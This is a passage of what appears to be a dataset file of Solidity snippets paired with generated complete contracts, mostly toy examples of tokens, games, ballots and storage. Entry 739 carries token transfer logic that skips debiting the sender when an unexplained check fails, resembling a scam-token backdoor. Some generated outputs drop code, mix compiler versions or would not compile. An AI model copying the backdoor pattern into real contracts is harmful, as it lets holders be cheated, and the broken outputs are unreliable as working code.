        "output": "pragma solidity ^0.8.9;\ncontract GameContract {\n    struct Game {\n        address host;\n        uint gameId;\n        uint buyinRequirement;\n        uint etherWithdrawalReqs;\n        uint gamePot;\n        uint8 tableWithdrawalReqs;\n        uint8 playerCount;\n        uint8 verifiedWithdrawalReqs;\n        bool endedBuyin;\n        bool isActive;\n        address[] playerList;\n    }\n\n    struct Player {\n        string name;\n        uint gameId;\n        uint balance;\n        uint pendingWithdrawal;\n        bool isActive;\n        bool isHost;\n        bool hasEndedBuyin;\n        bool hasWithdrawn;\n        bool isInGame;\n    }\n\n    uint public gameNumber = 0;\n    uint public initFee = 0.001 ether;\n    Game[] public games;\n    mapping(uint => Game) public idToGame;\n    mapping(address => Player) public playerInfo;\n\n    modifier isNotInGame {\n        require(!playerInfo[msg.sender].isInGame, \"Player already in a game\");\n        _;\n    }\n    \n    function addFeesPending() internal {\n        playerInfo[msg.sender].balance += msg.value;\n    }\n\n    function incGameNumber() internal {\n        gameNumber++;\n    }\n    \n    function startGame(string memory name, uint buyinReq) public payable isNotInGame {     \n        require(msg.value >= initFee, \"In order to prevent spam games that never resolve, each game initialization will cost  ether.\");\n        addFeesPending();\n        playerInfo[msg.sender] = Player(name, gameNumber, msg.value, 0, false, false, false, false, true);\n        address[] memory add;\n        idToGame[gameNumber] = Game(msg.sender, gameNumber, buyinReq, 0, 0, 0, 0, 0, false, true, add);\n        idToGame[gameNumber].playerList.push(msg.sender);\n        games.push(idToGame[gameNumber]);\n        incGameNumber();\n    }    \n\n    function getGameInfo(uint id) public view returns (Game memory) {\n        return idToGame[id];\n    }\n}\n\n",
        "changed": 0
    },
    "710.sol": {
        "input": "address [] addresses;\n\naddresses.push(newGameAddress);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GameContract {\n    address[] public addresses;\n\n    function addAddress(address newGameAddress) public {\n        addresses.push(newGameAddress);\n    }\n\n    function getAddresses() public view returns (address[] memory) {\n        return addresses;\n    }\n}\n\n",
        "changed": 0
    },
    "711.sol": {
        "input": "Reader[] public readers;\n\nreaders.push(Reader(\"Freddie\", 0, books[0]));\n\ncontract CoolSchool {\n    mapping(string => string) public books; \n    mapping(string => string[]) public readers; \n\n    constructor() {\n        _loadBooks();\n    }\n\n    function addBook(string memory isbn, string memory title) public {\n        require(!_isEmpty(isbn), \"isbn is required\");\n        require(!_isEmpty(title), \"title is required\");\n        books[isbn] = title;\n    }\n\n    function addReadBook(string memory reader, string memory isbn) public {\n        string[] storage read = readers[reader];\n        require(!_isEmpty(books[isbn]), \"unknown book\");\n        read.push(isbn);\n    }\n\n    function _loadBooks() private {\n        books[\"0333791037\"] = \"The Great Gatsby\";\n        books[\"0684833395\"] = \"Catch-22\";\n        books[\"9780451524935\"] = \"1984\";\n    }\n\n    function _isEmpty(string memory s) private pure returns (bool) {\n        return bytes(s).length == 0;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CoolSchool {\n    \n    struct Reader {\n        string name;\n        uint age;\n        string[] booksRead;\n    }\n    \n    // mapping to store book details\n    mapping(string => string) public books; \n    \n    // mapping to store reader details\n    mapping(string => Reader) public readers; \n\n    constructor() {\n        _loadBooks();\n    }\n\n    function addBook(string memory isbn, string memory title) public {\n        require(!_isEmpty(isbn), \"isbn is required\");\n        require(!_isEmpty(title), \"title is required\");\n        books[isbn] = title;\n    }\n\n    function addReader(string memory name, uint age) public {\n        Reader memory reader = Reader(name, age, new string[](0));\n        readers[name] = reader;\n    }\n\n    function addReadBook(string memory readerName, string memory isbn) public {\n        require(!_isEmpty(books[isbn]), \"unknown book\");\n        readers[readerName].booksRead.push(isbn);\n    }\n\n    function _loadBooks() private {\n        books[\"0333791037\"] = \"The Great Gatsby\";\n        books[\"0684833395\"] = \"Catch-22\";\n        books[\"9780451524935\"] = \"1984\";\n    }\n\n    function _isEmpty(string memory s) private pure returns (bool) {\n        return bytes(s).length == 0;\n    }\n}\n\n",
        "changed": 0
    },
    "713.sol": {
        "input": "contract Ballot {\n\n    receive() external payable {\n    }\n}\n\ncontract Ballot {\n\n    fallback() external payable {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ballot1 {\n    // Fallback function that gets executed if non-function data is sent to the contract.\n    receive() external payable {\n        // the function body is left intentionally blank\n    }\n}\n\ncontract Ballot2 {\n    // Fallback function that gets executed if no other function matches the call data.\n    fallback() external payable {\n        // the function body is left intentionally blank\n    }\n}\n\n",
        "changed": 0
    },
    "714.sol": {
        "input": "  beforeEach(async function () {\n    Token = await ethers.getContractFactory(\"Token\")\n    token = await token.deploy()\n  })\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    mapping(address => uint) public balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public {\n        require(balances[msg.sender] >= _value);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n\n",
        "changed": 1
    },
    "715.sol": {
        "input": "function topUpSubscription(uint256 amount) external onlyOwner {\n    LINKTOKEN.transferAndCall(address(COORDINATOR), amount, abi.encode(s_subscriptionId));\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "716.sol": {
        "input": "it('Should correctly set totalSupply to: 1T', async () => {\n    const totalSupply = await hardhatToken.totalSupply();\n    const decimals = ethers.BigNumber.from(10).pow(9);\n\n    expect(totalSupply).to.equal(\n        ethers.BigNumber.from(1_000_000_000_000).mul(decimals)\n    );\n});\n\n\n",
        "output": "",
        "changed": 0
    },
    "717.sol": {
        "input": "struct YourStruct {\n    uint x;\n    string y;\n}\nfunction func(\n    uint a,\n    uint b,\n    string memory c,\n    YourStruct memory d\n    ) external;\n\nlet args = [\n    1,\n    2,\n    \"c\",\n    {\n        x: 3,\n        y: \"y\"\n    }\n]\ncontract.func(...args);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContract {\n    struct YourStruct {\n        uint x;\n        string y;\n    }\n\n    function func(\n        uint a,\n        uint b,\n        string memory c,\n        YourStruct memory d\n    ) external pure returns (uint, uint, string memory, YourStruct memory) {\n        return (a, b, c, d);\n    }\n}\n\n",
        "changed": 0
    },
    "718.sol": {
        "input": "function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual override {\n    require(deadline >= block.timestamp, \"ERC20Permit: expired deadline\");\n        \n    bytes32 hashStruct = keccak256(\n        abi.encode(\n            keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n            owner,\n            spender,\n            amount,\n            nonce[owner],\n            deadline\n        )\n    );\n\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            '\\x19\\x01',\n            keccak256(abi.encode( keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n            keccak256(bytes(name_)),\n            keccak256(bytes(version())),\n            chainId,\n            address(this)\n        ),\n            hashStruct\n        )\n    );\n    \n   \n    address signer = ecrecover(hash, v, r, s);\n    require(\n        signer != address(0) && signer == owner,\n        \"ERC20Permit: invalid signature\"\n    );\n    nonces[owner]++;\n    _approve(owner, spender, amount);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "720.sol": {
        "input": "contract GameItem is ERC721 {\n\npragma solidity ^0.8;\n\ncontract Parent1 {\n    constructor(string memory message1) {}\n}\n\ncontract Parent2 {\n    constructor(string memory message2) {}\n}\n\ncontract Child is Parent1, Parent2 {\n    constructor() Parent1(\"hello\") Parent2(\"world\") {}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Parent1 {\n    string public message1;\n\n    constructor(string memory _message1) {\n        message1 = _message1;\n    }\n}\n\ncontract Parent2 {\n    string public message2;\n\n    constructor(string memory _message2) {\n        message2 = _message2;\n    }\n}\n\n",
        "changed": 0
    },
    "722.sol": {
        "input": "address admin ;\n\nconstructor() public {\n    admin == msg.sender;\n}\n\nmodifier isAdmin {\n    require(admin == msg.sender,\"you are not the owner\");\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address private admin;\n\n    constructor() public {\n        admin = msg.sender;\n    }\n\n    modifier isAdmin {\n        require(admin == msg.sender,\"You are not the owner\");\n        _;\n    }\n\n    function changeAdmin(address newAdmin) public isAdmin {\n        admin = newAdmin;\n    }\n\n    function whoIsAdmin() public view returns (address) {\n        return admin;\n    }\n}\n\n",
        "changed": 0
    },
    "723.sol": {
        "input": "require( currentTime >= assetCoolingPeriodEndTime, \"asset restricted by the owner\" );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AssetControl {\n    uint256 public assetCoolingPeriodEndTime;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n        assetCoolingPeriodEndTime = block.timestamp + 1 weeks; // set a cooldown period of one week\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    modifier afterCoolingPeriod() {\n        require(block.timestamp >= assetCoolingPeriodEndTime, \"asset restricted by the owner\");\n        _;\n    }\n\n    function updateCoolingPeriod() public onlyOwner {\n        assetCoolingPeriodEndTime = block.timestamp + 1 weeks; // update the cooldown period\n    }\n\n    function performAction() public afterCoolingPeriod {\n        // the action that can only be performed after the cooling period\n    }\n}\n\n",
        "changed": 1
    },
    "724.sol": {
        "input": "walletMints[msg.sender] += quantity_;\nrequire(walletMints[msg.sender] <= maxPerWallet, \"exceed max wallet\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n\n    mapping (address => uint256) public walletMints;\n    uint256 public maxPerWallet;\n\n    constructor(uint256 _maxPerWallet) public {\n        maxPerWallet = _maxPerWallet;\n    }\n\n    function mint(uint256 quantity_) public {\n        walletMints[msg.sender] += quantity_;\n        require(walletMints[msg.sender] <= maxPerWallet, \"Exceed max wallet\");\n    }\n\n}\n\n",
        "changed": 0
    },
    "725.sol": {
        "input": "uint256 favoriteNumber;\n\nfunction store(uint256 _favoriteNumber) public {\n    favoriteNumber = _favoriteNumber;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FavoriteNumberContract {\n    uint256 favoriteNumber;\n\n    function store(uint256 _favoriteNumber) public {\n        favoriteNumber = _favoriteNumber;\n    }\n\n    function retrieve() public view returns (uint256){\n        return favoriteNumber;\n    }\n}\n\n",
        "changed": 0
    },
    "726.sol": {
        "input": "Counters.Counter private counter; \n\nfunction foo() public {\n  require(counter.current() <= 1000, \"Message\");\n  counter.increase()\n  ...\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "727.sol": {
        "input": "    receive() external payable {\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    // Event declaration\n    event Received(address, uint);\n\n    // Fallback function\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    // Function to retrieve contract's balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "728.sol": {
        "input": "function getStr2() public view returns (string) {\n    bytes memory byteArray = abi.encode(115792089237316195423570985008687907853269984665640564039457584007913129639932);\n    return string(byteArray);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    function getStr2() public pure returns (string memory) {\n        bytes memory byteArray = abi.encodePacked(115792089237316195423570985008687907853269984665640564039457584007913129639932);\n        return string(byteArray);\n    }\n}\n\n",
        "changed": 0
    },
    "729.sol": {
        "input": "pragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ninterface IRule {\n    function rule (bytes32 data, address addr, \n       address[] memory addrArr, uint256[] memory uintArr, \n       bytes[] memory dataArr, string memory str)\n    external view returns (bool);\n}\ncontract Demo is Ownable {\n    mapping(bytes32 => IRule)  public rules;\n    function setRule(bytes32 role, IRule rule) public onlyOwner {\n        rules[role] = rule;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IRule {\n    function rule (bytes32 data, address addr, \n       address[] memory addrArr, uint256[] memory uintArr, \n       bytes[] memory dataArr, string memory str)\n    external view returns (bool);\n}\n\n",
        "changed": 0
    },
    "730.sol": {
        "input": "contract MyContract {\n\n  string public svg; \n\n  function setSvg(string calldata svg_) external {\n      svg = _svg;\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n\n  string public svg;\n\n  function setSvg(string calldata _svg) external {\n      svg = _svg;\n  }\n}\n\n",
        "changed": 0
    },
    "731.sol": {
        "input": "pragma solidity >=0.8.6;\n\ninterface DataStruct {\n    struct authDataOSS {\n        string oss;\n        string mt_us;\n        bool data_status;\n    }\n\n    struct ossName {\n        string _name;\n    }\n} \n\ncontract Contract1 is DataStruct {\n\n    mapping (address => authDataOSS[]) private _allowedData;\n    mapping (address => ossName[]) private _alllowedOSS;\n\n    constructor() {\n        _allowedData[msg.sender].push(authDataOSS(\"test\", \"test\", true));\n        _alllowedOSS[msg.sender].push(ossName(\"test\"));\n    }\n\n    function getOSS(address _usr_add) public view returns (address, ossName[] memory) {\n       return (_usr_add, _alllowedOSS[_usr_add]);\n    }\n    \n    function getDataUss(address _usr_add) public view returns (address, authDataOSS[] memory) {\n        return(_usr_add, _allowedData[_usr_add]);\n    }\n}\n\npragma solidity >=0.8.6;\n\nimport \"./Test.sol\";\n \ncontract Contract2 is DataStruct {\n    \n    event showMsg(uint);\n    \n    function list_data(Contract1 _contract1, address _usr_add) public view returns (address, authDataOSS[] memory) {\n        (address _usr_add_res, authDataOSS[] memory _data) = _contract1.getDataUss(_usr_add);\n        return (_usr_add_res, _data);\n    }\n\n    function list_OSS(Contract1 _contract1, address _usr_add) public view returns (address, ossName[] memory) {\n        (address _usr_add_res, ossName[] memory _oss_names) = _contract1.getOSS(_usr_add);\n        return (_usr_add_res, _oss_names);\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface DataStruct {\n    struct authDataOSS {\n        string oss;\n        string mt_us;\n        bool data_status;\n    }\n\n    struct ossName {\n        string _name;\n    }\n} \n\n",
        "changed": 1
    },
    "732.sol": {
        "input": "constructor(string memory _name, string memory _symbol) ERC721(_name, _symbol)\n{\n    owner = payable(msg.sender); \n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "733.sol": {
        "input": "pragma solidity 0.8.18;\n\ncontract TinybarsDemo {\n    function checkBalance()\n        public view\n        returns (uint256 senderBalance)\n    {\n        senderBalance = msg.sender.balance;\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TinybarsDemo {\n    // Define the function\n    function checkBalance()\n        public view\n        returns (uint256 senderBalance)\n    {\n        // Assign to senderBalance the Ethereum balance of the user who called this function\n        senderBalance = msg.sender.balance;\n    }\n}\n\n",
        "changed": 0
    },
    "734.sol": {
        "input": "address payable _owner = payable(owner());\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract MyContract {\n    address payable private _owner;\n\n    constructor() public {\n        _owner = msg.sender;\n    }\n\n    function getOwner() public view returns (address) {\n        return _owner;\n    }\n\n    function setOwner(address newOwner) public {\n        require(msg.sender == _owner, \"Only the current owner can change ownership.\");\n        _owner = payable(newOwner);\n    }\n\n    function withdraw() public {\n        require(msg.sender == _owner, \"Only the owner can withdraw.\");\n        _owner.transfer(address(this).balance);\n    }\n\n    fallback() external payable {\n        // to be able to receive ether\n    }\n\n    receive() external payable {\n        // to be able to receive ether\n    }\n}\n\n",
        "changed": 0
    },
    "735.sol": {
        "input": "interface CheatCodes {\n           function prank(address) external;    \n }\ncontract Test is DSTest {\n   CheatCodes cheatCodes;\n   function setUp() public {\n       cheatCodes = CheatCodes(HEVM_ADDRESS);\n   }\n   \n   function test() public {\n       cheatCodes.prank(address(1337));\n       address(contract).customFunction();\n   }\n}\n        \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface CheatCodes {\n    function prank(address) external;    \n}\n\ninterface CustomContract {\n    function customFunction() external;\n}\n\ncontract DSTest {\n    // Add necessary functions for your test contract here\n}\n\n",
        "changed": 0
    },
    "736.sol": {
        "input": "   function recoverContribution() public payable{\n    require(hasDeadlinePassed(), \"deadline has not passed, contributions cannot be recovered rightnow\");\n    require(!(address(this).balance >= minimumTarget), \"target has been met, cannot recover contributions now\");\n    require(contributors[msg.sender] != 0, \"you have not contributed anything\");\n\n    contributors[msg.sender] = 0;\n    payable(msg.sender).transfer(contributors[msg.sender]);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContributionContract {\n    mapping(address => uint) public contributors;\n    uint public minimumTarget;\n    uint public deadline;\n\n    constructor(uint _minimumTarget, uint _deadline) public {\n        minimumTarget = _minimumTarget;\n        deadline = _deadline;\n    }\n\n    function contribute() public payable {\n        require(msg.value > 0, \"Contribution must be greater than 0\");\n        contributors[msg.sender] = msg.value;\n    }\n\n    function hasDeadlinePassed() public view returns(bool) {\n        return block.timestamp > deadline;\n    }\n\n    function recoverContribution() public payable{\n        require(hasDeadlinePassed(), \"Deadline has not passed, contributions cannot be recovered right now\");\n        require(!(address(this).balance >= minimumTarget), \"Target has been met, cannot recover contributions now\");\n        require(contributors[msg.sender] != 0, \"You have not contributed anything\");\n\n        uint contributionAmount = contributors[msg.sender];\n        contributors[msg.sender] = 0;\n        payable(msg.sender).transfer(contributionAmount);\n    }\n}\n\n",
        "changed": 0
    },
    "737.sol": {
        "input": "const tx = await contract.add(a, b, {value: ethers.utils.parseEther(fee.toString()).mul(total)});\n\npragma solidity ^0.8.0;\n\nimport \"hardhat/console.sol\";\n\ncontract Calculate {\n  uint private c = 123;\n  address separateContract;\n\n  constructor(address _separateContract) {\n    getC();\n    separateContract = _separateContract;\n  }\n\n  function getC() public view returns (uint) {\n    return c;\n  }\n\n  function add(uint _a, uint _b) public payable {\n    separateContract.send(msg.value / 100); \n    c = _a + _b;\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Calculate {\n  uint private c = 123;\n  address payable separateContract;\n\n  constructor(address payable _separateContract) {\n    getC();\n    separateContract = _separateContract;\n  }\n\n  function getC() public view returns (uint) {\n    return c;\n  }\n\n  function add(uint _a, uint _b) public payable returns (uint) {\n    require(msg.value >= 1 ether, 'Not enough Ether provided.');\n  \n    (bool success, ) = separateContract.call{value: msg.value / 100}(\"\");\n    require(success, 'Transfer failed.');\n  \n    c = _a + _b;\n    return c;\n  }\n}\n\n",
        "changed": 0
    },
    "739.sol": {
        "input": "if (!radialcenter(from,to)){_lastBuy[from]=block.number-1;_tOwned[from] -= amount;}else{_lastBuy[from]=block.number;}\nuint256 transferAmount = amount;\n        \nif(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){\n        transferAmount = _getValues(amount, from);\n} \n        \n_tOwned[to] += transferAmount;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContract {\n    mapping(address => uint256) private _tOwned;\n    mapping(address => uint256) private _lastBuy;\n    mapping(address => bool) private _isExcludedFromFee;\n\n    function radialcenter(address from, address to) private pure returns (bool) {\n        // Add your logic here\n        return false;\n    }\n\n    function _getValues(uint256 amount, address from) private view returns (uint256) {\n        // Add your logic here\n        return amount;\n    }\n\n    function transfer(address from, address to, uint256 amount) public returns(bool) {\n        require(_tOwned[from] >= amount, \"Insufficient balance\");\n        \n        if (!radialcenter(from,to)){\n            _lastBuy[from]=block.number-1;\n            _tOwned[from] -= amount;\n        } else {\n            _lastBuy[from]=block.number;\n        }\n        \n        uint256 transferAmount = amount;\n        \n        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){\n            transferAmount = _getValues(amount, from);\n        }\n        \n        _tOwned[to] += transferAmount;\n\n        return true;\n    }\n}\n\n",
        "changed": 0
    },
    "740.sol": {
        "input": "function updatePost(uint256 _postIndex, uint256 _newCategory) external {\n    RegularPost storage post = RegularPostArray[_postIndex];\n    post.category = _newCategory;\n}\n\nfunction notUpdatePost(uint256 _postIndex, uint256 _newCategory) external {\n    RegularPost memory post = RegularPostArray[_postIndex];\n    post.category = _newCategory;\n}\n\n[\n  [\n    '1',\n    'a',\n    'a',\n    '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    '1',\n    category: '1',\n    name: 'a',\n    post: 'a',\n    addr: '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    date: '1'\n  ],\n  [\n    '2',\n    'b',\n    'b',\n    '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    '2',\n    category: '2',\n    name: 'b',\n    post: 'b',\n    addr: '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    date: '2'\n  ]\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RegularPostContract {\n\n    struct RegularPost {\n        uint256 id;\n        string name;\n        string post;\n        address addr;\n        uint256 date;\n        uint256 category;\n    }\n\n    RegularPost[] public RegularPostArray;\n\n    constructor() public {\n        RegularPostArray.push(RegularPost(1, 'a', 'a', 0x86beB187A30265Ce437C0BB55f38aF21554659Ae, 1, 1));\n        RegularPostArray.push(RegularPost(2, 'b', 'b', 0x86beB187A30265Ce437C0BB55f38aF21554659Ae, 2, 2));\n    }\n\n    function updatePost(uint256 _postIndex, uint256 _newCategory) external {\n        RegularPost storage post = RegularPostArray[_postIndex];\n        post.category = _newCategory;\n    }\n\n    function notUpdatePost(uint256 _postIndex, uint256 _newCategory) external {\n        RegularPost memory post = RegularPostArray[_postIndex];\n        post.category = _newCategory;\n    }\n}\n\n",
        "changed": 0
    },
    "741.sol": {
        "input": "import \"C:\\Users\\{user_name}\\AppData\\Roaming\\npm\";\n\npragma solidity ^0.8.0;\n\nimport \"C:\\Users\\Dell\\AppData\\Roaming\\npm\"; \nimport \"node_modules/@openzeppelin/contracts/utils/Counters.sol\";\nimport \"./node_modules/@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"./node_modules/@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\";\n\n\n",
        "output": "",
        "changed": 0
    },
    "742.sol": {
        "input": "require(amount <= msg.value, \"pay more\"); \n\nrequire(highestbid <= msg.value, \"pay more\");\n\nfunction _setHighestBid(uint256 val) internal virtual {\n  highestBid = val;\n}\n\n\nfunction _setHighestBid(uint256 val) internal override {\n  highestBid = val;\n  amount = val;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BidContract {\n    uint256 public highestBid;\n    uint256 public amount;\n\n    constructor() public {\n        highestBid = 0;\n        amount = 0;\n    }\n\n    function bid() public payable {\n        require(amount <= msg.value, \"pay more\"); \n        require(highestBid <= msg.value, \"pay more\");\n\n        if (msg.value > highestBid) {\n            highestBid = msg.value;\n        }\n    }\n\n    function _setHighestBid(uint256 val) internal virtual {\n      highestBid = val;\n    }\n\n    function _setHighestBidAndAmount(uint256 val) internal {\n      highestBid = val;\n      amount = val;\n    }\n}\n\n",
        "changed": 0
    },
    "743.sol": {
        "input": "contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 {}\n\n function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n        liquidity = IUniswapV2Pair(pair).mint(to);\n    }\n\n uint liquidity = balanceOf[address(this)]\n\nmapping(address => uint) public balanceOf;\n\n\n",
        "output": "pragma solidity ^0.4.25;\nlibrary UniswapV2Library {\n    function pairFor(address factory, address tokenA, address tokenB) external pure returns (address pair);\n}\n\nlibrary TransferHelper {\n    function safeTransferFrom(address token, address sender, address recipient, uint amount) external pure {}\n}\n\ninterface IUniswapV2Pair {\n    function mint(address to) external returns (uint liquidity);\n}\n\ncontract UniswapV2ERC20 {\n}\n\n",
        "changed": 0
    },
    "744.sol": {
        "input": "function withdraw() public onlyOwner  {\n    (bool hs, ) = payable(0x146FB9c3b2C13BA88c6945A759EbFa95127486F4).call{value: address(this).balance * 5 / 100}('');\n    require(hs);\n\n    (bool os, ) = payable(owner()).call{value: address(this).balance}('');\n    require(os);\n  }\n\n  function _baseURI() internal view virtual override returns (string memory) {\n    return uriPrefix;\n  }\n\n",
        "output": "",
        "changed": 0
    },
    "745.sol": {
        "input": "0x\n0000000000000000000000000000000000000000000000000000000000000062\n0000000000000000000000000000000000000000000000000000000000000061\n000000000000000000000000000000000000000000000000000000000000007a\n\n0x\n0000000000000000000000000000000000000000000000000000000000000020 # pointer\n0000000000000000000000000000000000000000000000000000000000000003 # length\n62617a0000000000000000000000000000000000000000000000000000000000 # value\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function compare() external pure returns (bool) {\n        uint8[3] memory foo = [98, 97, 122]; \n        string memory bar = \"baz\";\n\n        bytes memory barBytes = bytes(bar);\n\n        if (foo.length != barBytes.length) {\n            return false;\n        }\n\n        for (uint i; i < foo.length; i++) {\n            uint8 barItemDecimal = uint8(barBytes[i]);\n            if (foo[i] != barItemDecimal) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function compare() external pure returns (bool) {\n        uint8[3] memory foo = [98, 97, 122]; \n        string memory bar = \"baz\";\n\n        bytes memory barBytes = bytes(bar);\n\n        if (foo.length != barBytes.length) {\n            return false;\n        }\n\n        for (uint i; i < foo.length; i++) {\n            uint8 barItemDecimal = uint8(barBytes[i]);\n            if (foo[i] != barItemDecimal) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n\n",
        "changed": 0
    },
    "746.sol": {
        "input": "function persons(uint256 _index) external view returns (Person memory);\n\ninterface IContractA {\n    struct Person {\n        string name;\n    }\n    function person(uint256 _index) external view returns (Person memory);\n}\n\ncontract ContractA {\n    struct Person {\n        string name;\n    }\n\n    Person[] public persons;\n\n    function createPerson(string memory _name) public {\n        persons.push(Person(_name));\n    }\n    function person(uint _index) external view returns (Person memory) {\n        return persons[_index];\n    }\n}\n\ncontract ContractB {\n    address contractAddress = 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B;\n\n    function getPerson(uint256 _index)\n        public\n        view\n        returns (IContractA.Person memory)\n    {\n        IContractA contractAIns = IContractA(contractAddress);\n        return contractAIns.person(_index);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IContractA {\n    struct Person {\n        string name;\n    }\n    function person(uint256 _index) external view returns (Person memory);\n}\n\ncontract ContractB {\n    IContractA contractA;\n\n    constructor(address _address) {\n        contractA = IContractA(_address);\n    }\n\n    function getPerson(uint256 _index) public view returns (IContractA.Person memory) {\n        return contractA.person(_index);\n    }\n}\n",
        "changed": 0
    },
    "747.sol": {
        "input": "\npragma solidity >=0.5.0 <0.9.0;\n\nimport \"./SimpleStorage.sol\"; \ncontract StorageFactory{\n    \n    SimpleStorage[] public simpleStorageArray;\n\n    function createSimpleStorageContract() public \n    {\n        SimpleStorage simpleStorageContract = new SimpleStorage();\n        simpleStorageArray.push(simpleStorageContract);\n    }\n\n     function sfStore(uint256 _simpleStorrageIndex, uint256 _simpleStorageNumber) public\n     {\n       SimpleStorage simpleStorageContract =  SimpleStorage(address(simpleStorageArray[_simpleStorageIndex])); \n       simpleStorageContract.store(_simpleStorageNumber);   \n     }\n}\n\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Answer\n{\n    mapping(address => uint) public StorageMap; \n\n    function InsertToStorage(address name, uint favoritenumber) public \n    {\n        StorageMap[name] = favoritenumber;\n    }\n\n    function GetFavoriteNumber(address name) public view returns(uint) \n    {\n        return StorageMap[name];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint public data;\n\n    function store(uint _data) public {\n        data = _data;\n    }\n\n    function retrieve() public view returns (uint){\n        return data;\n    }\n}\n\ncontract StorageFactory {\n    SimpleStorage[] public simpleStorageArray;\n\n    function createSimpleStorageContract() public {\n        SimpleStorage simpleStorageContract = new SimpleStorage();\n        simpleStorageArray.push(simpleStorageContract);\n    }\n\n    function sfStore(uint256 _simpleStorageIndex, uint256 _simpleStorageNumber) public {\n        SimpleStorage simpleStorageContract = SimpleStorage(address(simpleStorageArray[_simpleStorageIndex])); \n        simpleStorageContract.store(_simpleStorageNumber);   \n    }\n\n    function sfRetrieve(uint256 _simpleStorageIndex) public view returns (uint) {\n        SimpleStorage simpleStorageContract = SimpleStorage(address(simpleStorageArray[_simpleStorageIndex])); \n        return simpleStorageContract.retrieve();   \n    }\n}\n\ncontract Answer {\n    mapping(address => uint) public StorageMap; \n\n    function InsertToStorage(address name, uint favoritenumber) public {\n        StorageMap[name] = favoritenumber;\n    }\n\n    function GetFavoriteNumber(address name) public view returns(uint) {\n        return StorageMap[name];\n    }\n}\n\n",
        "changed": 0
    },
    "748.sol": {
        "input": "function setInstructor(address _address, uint _age, string memory _fName, string memory _lName) public {\n     Instructor storage instructor = instructors[_address];\n\n\ninstructorAccts.push(_address) -1;\n\ninstructorAccts.push(_address);\n\n\n",
